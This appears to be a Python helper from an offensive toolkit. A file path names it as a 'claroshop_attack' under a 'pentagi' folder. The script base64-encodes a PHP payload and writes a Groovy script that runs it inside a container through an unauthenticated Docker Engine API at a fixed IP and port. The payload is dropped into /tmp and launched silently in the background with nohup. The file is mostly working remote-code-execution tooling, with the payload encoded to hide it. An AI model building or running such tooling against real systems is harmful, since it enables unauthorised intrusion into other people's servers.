import re, base64

src = open(r'c:\xampp\htdocs\pentagi\claroshop_attack\m6_string_search.groovy', encoding='utf-8').read()
m = re.search(r"def phpCode = '''(.*?)'''", src, re.S)
php = m.group(1)
php = php.replace('\\\\', '\\')  # emular unescape de Groovy '''...'''
b64 = base64.b64encode(php.encode('utf-8')).decode('ascii')

template = r'''import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = "PHPB64PLACEHOLDER"

def shCmd = 'echo ' + phpB64 + ' | base64 -d > /tmp/m6.php && rm -f /tmp/m6_out.txt /tmp/m6_done && nohup bash -c "php /tmp/m6.php > /tmp/m6_out.txt 2>&1; touch /tmp/m6_done" > /dev/null 2>&1 & echo LAUNCHED'
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c",shCmd]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
println su.inputStream.text
'''

out = template.replace('PHPB64PLACEHOLDER', b64)
open(r'c:\xampp\htdocs\pentagi\claroshop_attack\m6_launch2.groovy', 'w', encoding='utf-8').write(out)
print('written', len(out))
